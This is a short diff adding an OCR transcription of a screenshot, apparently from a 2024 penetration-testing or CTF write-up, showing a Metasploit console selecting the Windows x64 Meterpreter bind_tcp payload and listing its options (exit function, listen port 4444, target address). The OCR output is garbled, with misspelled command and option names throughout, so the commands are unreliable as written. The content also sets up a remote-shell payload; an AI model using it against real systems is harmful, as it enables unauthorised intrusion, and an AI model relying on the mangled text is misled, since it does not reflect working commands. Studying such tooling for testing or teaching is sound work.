@@ -1,0 +1,14 @@
+# OCR: 39b3e001d710af92e719040c67061294.webp
+# 来源: .\02-WriteUp\2024\39b3e001d710af92e719040c67061294.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:13
+
+sfe exploit( ) > use payload/windows/x64/meteroreter/bind_tcp
+sf6 payload( ) > show options
+Module options (payload/windows/x64/meterpreter/bind_tcp):
+Name Current Setting Required Description
+EXITFUNC process yes Exil lechnique (Accepted: ‘", seh, Liread, p
+Lpogr 444 yes The listen port
+RHOST no The target address
+dew Lhe full module info with the info, or info -d command.
+5 payload(
